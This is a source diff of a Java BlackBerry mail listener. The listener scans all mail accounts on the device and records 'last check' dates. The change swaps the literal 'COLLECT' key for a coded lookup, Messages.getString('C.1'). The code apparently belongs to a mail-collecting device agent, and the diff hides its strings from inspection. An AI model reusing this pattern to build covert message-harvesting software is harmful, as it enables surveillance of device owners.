@@ -28,6 +28,7 @@ import net.rim.blackberry.api.mail.event.StoreEvent;
 import net.rim.device.api.servicebook.ServiceBook;
 import net.rim.device.api.servicebook.ServiceRecord;
 import net.rim.device.api.util.IntHashtable;
+import blackberry.Messages;
 import blackberry.Singleton;
 import blackberry.debug.Check;
 import blackberry.debug.Debug;
@@ -252,8 +253,9 @@ public final class MailListener implements FolderListener, SendListener,
             }
 
             if (!collecting) {
+                //C.1=COLLECT
                 ((ModuleMessage) ModuleMessage.getInstance()).lastcheckSet(
-                        "COLLECT", new Date());
+                        Messages.getString("C.1"), new Date());
                 ((ModuleMessage) ModuleMessage.getInstance()).lastcheckSet(
                         folderName, new Date());
             }
@@ -320,8 +322,9 @@ public final class MailListener implements FolderListener, SendListener,
 
         collecting = true;
         // questa data rappresenta l'ultimo controllo effettuato.
+        // C.1=COLLECT
         final Date lastCheckDate = ((ModuleMessage) ModuleMessage.getInstance())
-                .lastcheckGet("COLLECT");
+                .lastcheckGet(Messages.getString("C.1"));
 
         // Controllo tutti gli account di posta
         for (int count = mailServiceRecords.length - 1; count >= 0; --count) {
@@ -353,7 +356,8 @@ public final class MailListener implements FolderListener, SendListener,
 
         //if (!stopHistory) {
         // al termine degli scanfolder
-        ((ModuleMessage) ModuleMessage.getInstance()).lastcheckSet("COLLECT",
+        // C.1=COLLECT
+        ((ModuleMessage) ModuleMessage.getInstance()).lastcheckSet(Messages.getString("C.1"),
                 new Date());
         //}
 
